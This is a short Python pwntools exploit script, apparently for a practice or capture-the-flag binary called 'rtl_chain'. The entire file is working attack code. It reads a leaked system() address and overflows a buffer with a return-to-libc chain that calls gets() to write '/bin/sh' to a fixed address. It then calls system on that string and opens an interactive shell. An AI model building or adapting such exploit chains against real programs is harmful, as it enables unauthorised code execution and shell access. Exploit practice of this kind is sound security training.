from pwn import *

p = process("./rtl_chain")

gets_plt = 0x08048330 
popret = 0x804830d
param = 0x0804a024

p.recvuntil(" : ")
addr = int(p.recv(),16)

log.info("system addr : "+hex(addr))

payload = "a"*24
payload += p32(gets_plt)
payload += p32(popret)
payload += p32(param)
payload += p32(addr)
payload += "bbbb"
payload += p32(param)

pause()
p.sendline(payload)
p.sendline("/bin/sh")

p.interactive()

